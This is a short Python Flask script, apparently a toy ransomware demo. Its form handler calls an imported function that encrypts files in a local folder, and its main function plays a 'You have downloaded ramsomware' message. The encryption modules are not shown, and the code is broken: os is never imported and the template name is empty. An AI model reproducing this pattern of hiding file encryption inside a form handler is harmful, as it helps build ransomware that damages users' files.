import logging
from flask import Flask, render_template, request
import werkzeug
from . import virus
from . import totally_secret
import time

app = Flask(__name__)

@app.route('/')
def form():
    return render_template('')

@app.route('/complete', methods=['POST'])
def submitted_form():
    totally_secret.crypt_files(encrypt_dir_path=os.path.join(os.path.dirname(__file__),
                                'Totally_Secret_Folder'))



    name = request.form['name']
    email = request.form['email']
    site = request.form['site_url']
    comments = request.form['comments']

    return 200

def main():
    virus.create_and_play('You have downloaded ramsomware')

if __name__ == '__main__':
    main()

#    return render_template(
#        'submitted_form.html',
#        name=name,
#        email=email,
#        site=site,
#        comments=comments)

#if __name__ == '__main__':
#    setup()
#    app.run()